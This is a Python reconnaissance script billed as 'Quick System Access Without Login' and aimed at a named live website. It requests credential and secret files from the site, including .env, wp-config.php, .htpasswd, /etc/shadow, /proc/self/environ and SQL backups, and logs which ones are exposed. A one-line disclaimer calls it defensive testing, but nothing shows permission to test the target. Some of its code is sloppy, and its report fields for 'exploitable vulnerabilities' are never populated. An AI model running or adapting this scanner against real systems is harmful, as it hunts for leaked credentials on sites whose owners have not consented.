#!/usr/bin/env python3
"""
Rapid Alternative Access - Quick System Access Without Login
Author: ShadowScan Security Team
Purpose: Quick alternative access methods for systems without authentication
"""

import asyncio
import aiohttp
import json
import time
from datetime import datetime
from typing import Dict, List, Any

class RapidAlternativeAccess:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.results = {
            "scan_info": {
                "target_url": target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Rapid Alternative Access",
                "scan_duration": "30-60 detik"
            },
            "summary": {
                "endpoints_found": 0,
                "access_points": [],
                "exploitable_vulnerabilities": 0,
                "system_info": {}
            },
            "endpoints_found": [],
            "access_points": [],
            "exploitable_vulnerabilities": [],
            "system_info": {}
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def rapid_access_test(self):
        """Rapid access test"""
        print("⚡ RAPID ALTERNATIVE ACCESS")
        print("=" * 50)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 50)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 50)

        # Quick tests
        await self.quick_system_info_gathering()
        await self.quick_api_discovery()
        await self.quick_file_access_test()
        await self.quick_config_discovery()

        await self.generate_rapid_report()

    async def quick_system_info_gathering(self):
        """Quick system information gathering"""
        print("🔍 Quick System Info Gathering")

        endpoints = [
            "/robots.txt",
            "/.well-known/security.txt",
            "/favicon.ico",
            "/sitemap.xml",
            "/crossdomain.xml",
            "/clientaccesspolicy.xml",
            "/.env",
            "/config.json",
            "/api/config",
            "/settings.json"
        ]

        for endpoint in endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.get(url, timeout=5) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 0:
                            print(f"🔍 Found: {endpoint}")
                            self.results["endpoints_found"].append({
                                "endpoint": endpoint,
                                "status": "200",
                                "content_length": len(content)
                            })
            except Exception:
                pass

    async def quick_api_discovery(self):
        """Quick API discovery"""
        print("🔌 Quick API Discovery")

        api_endpoints = [
            "/api",
            "/api/v1",
            "/api/v2",
            "/rest",
            "/graphql",
            "/admin/api",
            "/user/api"
        ]

        for endpoint in api_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.get(url, timeout=5) as response:
                    if response.status in [200, 401, 403, 404]:
                        print(f"🔌 API Found: {endpoint} (Status: {response.status})")
                        self.results["endpoints_found"].append({
                            "endpoint": endpoint,
                            "status": response.status,
                            "type": "api"
                        })
            except Exception:
                pass

    async def quick_file_access_test(self):
        """Quick file access test"""
        print("📁 Quick File Access Test")

        file_paths = [
            "/etc/passwd",
            "/etc/hosts",
            "/etc/shadow",
            "/proc/version",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/syslog",
            "/tmp/",
            "/tmp/config.php",
            "/tmp/database.php",
            "/backup.sql",
            "/backup/database.sql"
        ]

        for file_path in file_paths:
            try:
                url = f"{self.target_url}{file_path}"
                async with self.session.get(url, timeout=5) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"📁 File Access: {file_path}")
                        self.results["endpoints_found"].append({
                            "endpoint": file_path,
                            "status": "200",
                            "content_length": len(content)
                        })
            except Exception:
                pass

    async def quick_config_discovery(self):
        """Quick configuration discovery"""
        print("⚙️ Quick Config Discovery")

        config_files = [
            "/config.php",
            "/wp-config.php",
            "/database.php",
            "/db.php",
            "/settings.php",
            "/admin/config.php",
            "/application/config.php",
            "/system/config.php",
            ".htaccess",
            ".htpasswd",
            "web.config",
            "web.xml"
        ]

        for config_file in config_files:
            try:
                url = f"{self.target_url}{config_file}"
                async with self.session.get(url, timeout=5) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 100:  # Potentially interesting config
                            print(f"⚙️ Config Found: {config_file}")
                            self.results["endpoints_found"].append({
                                "endpoint": config_file,
                                "status": "200",
                                "content_length": len(content)
                            })
            except Exception:
                pass

    async def generate_rapid_report(self):
        """Generate rapid report"""
        report_filename = f"rapid_access_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        self.results["summary"]["endpoints_found"] = len(self.results["endpoints_found"])

        with open(report_filename, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n⚡ RAPID ACCESS SUMMARY:")
        print(f"   Endpoints Found: {self.results['summary']['endpoints_found']}")
        print(f"   Access Points: {len(self.results['access_points'])}")
        print(f"   Exploitable Vulnerabilities: {len(self.results['exploitable_vulnerabilities'])}")

        print(f"\n📋 Report: {report_filename}")
        print("⚡ RAPID ALTERNATIVE ACCESS COMPLETED! ⚡")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with RapidAlternativeAccess(target_url) as explorer:
        await explorer.rapid_access_test()

if __name__ == "__main__":
    asyncio.run(main())